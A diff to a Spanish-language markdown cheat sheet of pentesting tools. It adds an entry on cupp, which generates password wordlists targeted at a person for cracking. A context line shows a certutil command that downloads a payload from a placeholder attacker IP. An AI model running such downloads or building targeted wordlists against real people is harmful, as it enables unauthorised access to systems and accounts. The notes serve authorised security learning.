@@ -33,6 +33,15 @@ Herramienta nativa de Windows para **gestionar certificados y realizar operacion
 - Limitaciones: requiere conectividad para descargar; sus operaciones quedan registradas y pueden ser inspeccionadas por EDR/proxy.
 - Ejemplos: `certutil -urlcache -f http://<IP_atacante>/<ruta_payload> <nuevo_nombre>`, `certutil -hashfile <archivo> SHA256`, `certutil -dump <certificado.cer>`
 
+### `cupp`
+- Herramienta para **generación de diccionarios de contraseñas personalizadas** basada en información del objetivo.
+- Crea **wordlists dirigidas** combinando datos personales como nombre, apellidos, fechas importantes, apodos, mascotas, intereses y patrones comunes de contraseñas humanas.
+- Uso típico en **auditorías de contraseñas** para preparar diccionarios más efectivos que los genéricos y utilizarlos con herramientas como `hydra`, `john`, `hashcat`, `crackmapexec` o `netexec`.
+- Dispone de un **modo interactivo (`-i`)** que solicita información del objetivo y genera automáticamente múltiples combinaciones.
+- Incluye mutaciones comunes con números, símbolos, años y variaciones tipo **leetspeak**, configurables desde su archivo de configuración.
+- Herramienta potente y potencialmente intrusiva; usar **solo en entornos autorizados**, laboratorios o escenarios educativos.
+- Ejemplo: `cupp -i`, que genera un archivo `.txt` con el diccionario resultante listo para su uso.
+
 ### `crackmapexec`  
 Framework de post-explotación y enumeración para entornos Windows (CME).  
 - Herramienta en Python que permite **escanear y operar a gran escala** sobre protocolos Windows: SMB, WinRM, LDAP, MSSQL, etc.  
